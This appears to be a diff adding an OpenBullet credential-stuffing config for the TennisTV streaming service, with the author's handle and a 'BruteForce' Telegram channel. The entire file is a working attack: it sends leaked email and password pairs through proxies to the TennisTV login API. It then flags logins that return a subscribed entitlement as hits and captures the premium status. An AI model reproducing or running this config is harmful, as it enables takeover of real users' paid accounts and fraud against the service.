@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "TennisTV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-27T22:45:31.6421322+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Free Acc To Custom | CPM: 100_2000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tennistv.com/api/users/v1/login" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"errorCode\":\"UR002\",\"" 
+  KEYCHAIN Success OR 
+    KEY "entitlement\":\"SUBSCRIBED\",\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"entitlement\":\"REGISTERED\"" 
+
+PARSE "<SOURCE>" LR "\"entitlement\":\"" "\",\"" -> CAP "Premium" 
+
